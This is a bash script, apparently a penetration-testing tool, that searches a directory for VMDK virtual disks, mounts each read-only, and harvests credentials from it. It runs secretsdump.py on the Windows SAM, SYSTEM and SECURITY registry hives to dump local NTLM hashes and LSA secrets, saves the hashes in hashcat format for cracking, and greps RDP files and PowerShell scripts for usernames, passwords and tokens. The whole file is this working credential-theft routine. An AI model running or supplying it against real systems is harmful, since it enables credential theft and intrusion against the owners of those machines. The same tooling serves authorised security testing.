#!/bin/bash

SEARCH_DIR="${1:-.}"
MOUNT_BASE="/mnt/vmdk_enum"
mkdir -p "$MOUNT_BASE"

TIMESTAMP=$(date +%s)
RESULTS="vmdk_creds_results_${TIMESTAMP}.log"
HASHCAT_OUTPUT="vmdk_hashcat_hashes_${TIMESTAMP}.txt"

echo "[i] Starting VMDK credential sweep in: $SEARCH_DIR"
echo "[i] Results: $RESULTS"
echo "[i] Hashcat hashes: $HASHCAT_OUTPUT"
echo

find "$SEARCH_DIR" -type f -name "*.vmdk" \
    ! -name "*-s0*" \
    ! -name "*-delta.vmdk" \
    ! -name "*-ctk.vmdk" \
    ! -name "*-flat.vmdk" \
    | while read -r vmdk; do

    echo "========================================"
    echo "[i] VMDK File: $vmdk"
    echo "========================================"

    if [[ $(basename "$vmdk") =~ (-s0|delta|flat|ctk) ]]; then
        echo "[i]  Skipping snapshot or non-primary disk"
        continue
    fi

    if ! grep -q "CID" "$vmdk" 2>/dev/null && [[ $(stat -c%s "$vmdk") -lt 100000 ]]; then
        echo "[i]  Skipping descriptor-only or empty disk"
        continue
    fi

    timeout 8s guestfish --ro -a "$vmdk" -i <<EOF
list-filesystems
EOF
    > /tmp/gf_fs_output.txt 2>/dev/null

    if ! grep -q '^/dev/' /tmp/gf_fs_output.txt; then
        echo "[i]  Skipping (no valid filesystems or not mountable)"
        continue
    fi

    mount_dir="$MOUNT_BASE/$(basename "$vmdk" | sed 's/\.vmdk$//')_$RANDOM"
    mkdir -p "$mount_dir"
    timeout 12s guestmount -a "$vmdk" -i --ro "$mount_dir" 2>/dev/null

    if [[ $? -ne 0 ]]; then
        echo "[X] Failed to mount: $vmdk"
        rm -rf "$mount_dir"
        continue
    fi

    echo "[+] Mounted to $mount_dir"

    SYSTEM_HIVE=$(find "$mount_dir" -type f -iname "SYSTEM" | grep -i '/windows/system32/config' | head -n 1)
    SAM_HIVE=$(find "$mount_dir" -type f -iname "SAM" | grep -i '/windows/system32/config' | head -n 1)
    SECURITY_HIVE=$(find "$mount_dir" -type f -iname "SECURITY" | grep -i '/windows/system32/config' | head -n 1)

    if [[ -n "$SYSTEM_HIVE" && -n "$SAM_HIVE" ]]; then
        echo "[i] Extracting local account hashes..."
        secretsdump.py -sam "$SAM_HIVE" -system "$SYSTEM_HIVE" LOCAL 2>/dev/null \
            | tee -a "$RESULTS" \
            | grep -E '^[^ ]+:[0-9]+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}' >> "$HASHCAT_OUTPUT"
    else
        echo "[X] SAM/SYSTEM hives not found" | tee -a "$RESULTS"
    fi

    if [[ -n "$SECURITY_HIVE" && -n "$SYSTEM_HIVE" ]]; then
        echo "[i] Extracting LSA secrets..."
        secretsdump.py -security "$SECURITY_HIVE" -system "$SYSTEM_HIVE" LOCAL 2>/dev/null | tee -a "$RESULTS"
    else
        echo "[X] SECURITY hive not found" | tee -a "$RESULTS"
    fi

    echo "[>] Searching for RDP files..."
    find "$mount_dir" -type f -iname "*.rdp" | while read -r rdpfile; do
        echo "[+]  RDP File: $rdpfile" | tee -a "$RESULTS"
        grep -iE "username|password|full address" "$rdpfile" 2>/dev/null | tee -a "$RESULTS"
    done

    echo "[>] Searching for interesting .ps1 files (excluding system dirs)..."
    find "$mount_dir" -type f -iname "*.ps1" \
        | grep -ivE '/windows|/program files|/programdata' \
        | while read -r ps1file; do
            echo "[+] PowerShell Script: $ps1file" | tee -a "$RESULTS"
            grep -iE "(pass|cred|token|secret)" "$ps1file" 2>/dev/null | tee -a "$RESULTS"
        done

    guestunmount "$mount_dir"
    rm -rf "$mount_dir"
    echo "[i] Unmounted $vmdk"
    echo
done
